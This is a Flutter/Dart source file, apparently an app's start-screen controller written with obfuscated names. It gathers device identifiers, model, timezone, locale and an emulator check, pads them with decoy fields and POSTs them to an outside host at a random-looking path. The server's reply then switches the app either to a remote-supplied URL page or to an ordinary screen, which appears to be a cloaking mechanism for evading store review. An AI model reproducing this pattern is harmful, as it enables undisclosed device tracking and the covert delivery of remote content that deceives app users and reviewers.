import 'dart:io';
import 'package:dio/dio.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';


import 'package:package_info_plus/package_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';


class PlayStartLogic extends GetxController {

  var bjqomu = RxBool(false);
  var rtyvdphaj = RxBool(true);
  var dkglxmc = RxString("");
  var derek = RxBool(false);
  var crooks = RxBool(true);
  final pqwebo = Dio();


  InAppWebViewController? webViewController;

  dynamic klsaucxfj(){
    final frwgkoucb = InternetConnectionChecker.instance;
    final ufvwdtpgh = frwgkoucb.onStatusChange.skip(1).listen(
          (InternetConnectionStatus qaskgynlxp) {
        if (qaskgynlxp == InternetConnectionStatus.connected) {
          shipmxwa();
        } else {
          Get.toNamed('/RefreshPage')?.then((_){
            shipmxwa();
          });
        }
      },
    );
    return ufvwdtpgh;
  }

  Future<bool> erszhwjd() async {
    var qucpjsfw = await InternetConnectionChecker.instance.hasConnection;
    if(!qucpjsfw){
      Get.toNamed('/RefreshPage')?.then((_){
        shipmxwa();
      });
    }
    return qucpjsfw;
  }

  @override
  void onInit() {
    super.onInit();
    klsaucxfj();
    shipmxwa();
  }


  Future<void> shipmxwa() async {

    var yiqlnfor = await erszhwjd();
    if(!yiqlnfor){
      return;
    }

    derek.value = true;
    crooks.value = true;
    rtyvdphaj.value = false;

    pqwebo.post("https://zun.fleacloud.net/igeyjkmbwhtuxpzcqorvfnslad",data: await tnfmzhob()).then((value) {
      var lowyi = value.data["lowyi"] as String;
      var hrtzvea = value.data["hrtzvea"] as bool;
      if (hrtzvea) {
        dkglxmc.value = lowyi;
        garnett();
      } else {
        ullrich();
      }
    }).catchError((e) {
      rtyvdphaj.value = true;
      crooks.value = true;
      derek.value = false;
    });
  }

  Future<Map<String, dynamic>> tnfmzhob() async {
    final DeviceInfoPlugin gjxvp = DeviceInfoPlugin();
    PackageInfo cefoltxn_ygtxb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ykco = Platform.localeName;
    var milyfkj = currentTimeZone;

    var dwgqscpt = cefoltxn_ygtxb.packageName;
    var bwkrj = cefoltxn_ygtxb.version;
    var bwvgoeq = cefoltxn_ygtxb.buildNumber;

    var nwjzx = cefoltxn_ygtxb.appName;
    var adxkcyq = "";
    var qewxu  = "";
    var fwhouzn = "";
    var lilyanKulas = "";
    var stantonSporer = "";
    var gertrudeRaynor = "";
    var summerRowe = "";
    var matteoChamplin = "";
    var craigHickle = "";
    var lillianBrown = "";


    var bnhwfrx = "";
    var hxgbyp = false;

    if (GetPlatform.isAndroid) {
      bnhwfrx = "android";
      var azscuhbwmp = await gjxvp.androidInfo;

      fwhouzn = azscuhbwmp.brand;

      adxkcyq  = azscuhbwmp.model;
      qewxu = azscuhbwmp.id;

      hxgbyp = azscuhbwmp.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      bnhwfrx = "ios";
      var onyiwtjkl = await gjxvp.iosInfo;
      fwhouzn = onyiwtjkl.name;
      adxkcyq = onyiwtjkl.model;

      qewxu = onyiwtjkl.identifierForVendor ?? "";
      hxgbyp  = onyiwtjkl.isPhysicalDevice;
    }
    var res = {
      "nwjzx": nwjzx,
      "bwvgoeq": bwvgoeq,
      "dwgqscpt": dwgqscpt,
      "milyfkj": milyfkj,
      "fwhouzn": fwhouzn,
      "stantonSporer" : stantonSporer,
      "summerRowe" : summerRowe,
      "qewxu": qewxu,
      "ykco": ykco,
      "craigHickle" : craigHickle,
      "bnhwfrx": bnhwfrx,
      "hxgbyp": hxgbyp,
      "lilyanKulas" : lilyanKulas,
      "gertrudeRaynor" : gertrudeRaynor,
      "bwkrj": bwkrj,
      "matteoChamplin" : matteoChamplin,
      "lillianBrown" : lillianBrown,
      "adxkcyq": adxkcyq,

    };
    return res;
  }

  Future<void> ullrich() async {
    Get.offNamed("/LightTab");
  }

  Future<void> garnett() async {
    Get.offNamed("/ChangeLight");
  }

  @override
  void dispose() {
    klsaucxfj().cancel();
    super.dispose();
  }

}
